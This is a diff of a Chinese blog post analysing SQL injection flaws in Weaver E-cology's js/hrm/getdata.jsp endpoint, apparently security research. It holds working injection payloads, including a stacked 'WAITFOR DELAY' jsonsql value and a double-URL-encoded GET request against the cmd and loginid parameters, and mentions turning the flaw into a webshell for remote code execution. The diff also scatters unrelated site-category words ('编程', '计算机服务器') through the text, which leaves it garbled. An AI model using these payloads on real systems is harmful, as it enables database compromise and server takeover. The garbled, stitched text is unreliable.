@@ -8,8 +8,6 @@ asset_dir: embedded-base64
 
 [泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-cology是一款企业级协同办公自动化系统，主要为中大型企业提供全面的信息化解决方案。它以智能化、平台化和全程数字化为特点，旨在提升组织的协同办公效率和管理水平。由于E-cology将用户可控的参数拼接SQL语句，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)向数据库中写入数据，并利用Ole组件导出为Webshell，实现远程代码执行，进而获取服务器权限。
 
-编程
-
 # 影响版本
 
 补丁 < v10.75
@@ -22,15 +20,13 @@ asset_dir: embedded-base64
 
 深入探索
 
-计算机服务器
-
-计算机科学
-
-搜索引擎
-
-js/hrm/getdata.jsp 内容如下
+网络
 
 数据管理
+
+计算机服务器
+
+js/hrm/getdata.jsp 内容如下
 
 ```
 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
@@ -62,7 +58,13 @@ public static String getData(HttpServletRequest var0, ServletContext var1) {
 
 cmd 参数会在经过中间件默认解码后，还会再次解码，因此可以双重编码cmd参数的值，id等参数也是通用如此，且都是不区分大小写的。
 
-网络
+深入探索
+
+防病毒程序与恶意软件
+
+软件
+
+编程
 
 跟进 *`proc`* *方法*，它才是重点
 
@@ -82,8 +84,6 @@ private static String getUseDemand(String var0) {
 ```
 
 被直接拼接进sql语句中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，其他方法也大同小异。
-
-编程
 
 ## getPlanIdByApplyId
 
@@ -253,8 +253,6 @@ public boolean next() {
 
 直接执行 var14 的sql语句，即jsonsql里value的值，因此一个符合条件的jsonsql大致如下
 
-编程
-
 ```
 {"json":[{"key":"sql","value":"IF (1=1) WAITFOR DELAY'0:0:5'"}]}
 ```
@@ -330,7 +328,7 @@ public int getAllNum(String var1, String var2, String var3, String var4) {
     }
 ```
 
-fromid ==> var64 ==> var3 被直接拼接进SQL语句中，会造成SQL注入漏洞，idStr 如果存在，同样也是直接拼接进SQL语句中，也存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。
+fromid ==> var64 ==> var3 被直接拼接进SQL语句中，会造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，idStr 如果存在，同样也是直接拼接进SQL语句中，也存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。
 
 ## checkFromid
 
@@ -393,8 +391,6 @@ this.rs.executeSql(var3.toString());
 ```
 
 需要注意 `executeSql` 方法对特殊字符的过滤和检查，参考上面 `getTransferData` 方法部分的分析。
-
-编程
 
 ## userOffline
 
@@ -796,8 +792,6 @@ Host: ecology.mrxn.net
 ## verifyQuestion
 
 > loginid、qid、answer 三个参数均存在SQL注入
->
-> 编程
 
 ```
 GET /js/hrm/getdata.jsp?cmd=%25%37%36%25%36%35%25%37%32%25%36%39%25%36%36%25%37%39%25%35%31%25%37%35%25%36%35%25%37%33%25%37%34%25%36%39%25%36%66%25%36%65&id=1&loginid=%25%32%64%25%33%31%25%32%37%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33&qid=123&answer=1 HTTP/1.1
